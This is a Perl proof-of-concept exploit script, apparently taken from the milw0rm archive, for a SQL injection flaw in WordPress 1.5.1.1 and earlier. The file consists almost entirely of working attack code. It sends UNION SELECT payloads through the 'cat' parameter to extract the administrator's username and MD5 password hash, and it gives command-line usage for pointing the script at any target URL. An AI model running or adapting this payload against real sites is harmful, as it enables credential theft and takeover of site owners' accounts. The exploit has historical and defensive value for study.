#!/usr/bin/perl -w
#
# SQL Injection Exploit for WordPress <= 1.5.1.1
# This exploit shows the username of the administrator of the blog and his
# password crypted in MD5, you must only choose the correct version of the target
# Related advisory: http://www.gentoo.org/security/en/glsa/glsa-200506-04.xml
# Patch: download the last version at http://wordpress.org/download/
# Coded by Alberto Trivero

use LWP::Simple;

print "\n\t====================================\n";
print "\t= Exploit for WordPress <= 1.5.1.1 =\n";
print "\t=        by Alberto Trivero        =\n";
print "\t====================================\n\n";

if(!$ARGV[0] or !($ARGV[0]=~m/http/) or !($ARGV[1]==1 or $ARGV[1]==2)) {
   print "Usage:\nperl $0 [full_target_path] [target_version: 1 OR 2]\nVersion 1: WordPress <= 1.5\nVersion 2: WordPress 1.5.1 - 1.5.1.1\n\n";
   print "Examples:\nperl $0 http://www.example.com/wordpress/ 2\n";
   exit(0);
}

$page=get($ARGV[0]."index.php?cat=%2527%20UNION%20SELECT%20CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58))%20FROM%20wp_users/*") || die "[-] Unable to retrieve: $!" if($ARGV[1]==1);
$page=get($ARGV[0]."index.php?cat=999%20UNION%20SELECT%20null,CONCAT(CHAR(58),user_pass,CHAR(58),user_login,CHAR(58)),null,null,null%20FROM%20wp_users/*") || die "[-] Unable to retrieve: $!" if($ARGV[1]==2);
print "[+] Connected to: $ARGV[0]\n";
$page=~m/:([a-f0-9]{32}):(.*?):/;
print "[+] Username of administrator is: $2\n" if($2);
print "[+] MD5 hash of password is: $1\n" if($1);
print "[-] Unable to retrieve username\n" if(!$2);
print "[-] Unable to retrieve hash of password\n" if(!$1);

# milw0rm.com [2005-06-22]
